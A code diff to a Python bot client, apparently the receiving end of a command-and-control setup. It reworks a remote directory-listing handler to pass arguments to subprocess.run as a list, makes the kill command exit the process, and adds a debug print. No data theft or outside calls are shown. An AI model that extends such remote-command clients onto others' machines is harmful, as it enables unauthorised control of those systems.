@@ -80,9 +80,10 @@ class BotController:
 
     def handle_list_dir(self, payload: bytes):
         path = payload.decode()
-        command = f"ls {path}"
 
-        subp_command = subprocess.run(command, capture_output=True)
+        subp_command = subprocess.run(["ls", path],
+                                      capture_output=True,
+                                      text=True)
         if subp_command.returncode != 0:
             return RESP_TYPES["error"], subp_command.stderr
         return RESP_TYPES["ok"], subp_command.stdout
@@ -114,7 +115,7 @@ class BotController:
 
     def handle_kill(self, payload: bytes):
         # return value for keep alive boolean variable
-        return False 
+        exit()
 
     def handle_commands(self, cmd_type: int, payload: bytes) -> tuple[int, bytes]:
         handlers = {
@@ -158,6 +159,7 @@ class Subscriber:
                 print(f"Cmd: {cmd_type};\nPayload: {payload}")
                 r, p = self.bot_controller.handle_commands(cmd_type=cmd_type, payload=payload)
                 print(f"Ran the command with response '{r}'.\nOutput: '{p}'")
+                print(type(p))
 
                 # send response
                 try:
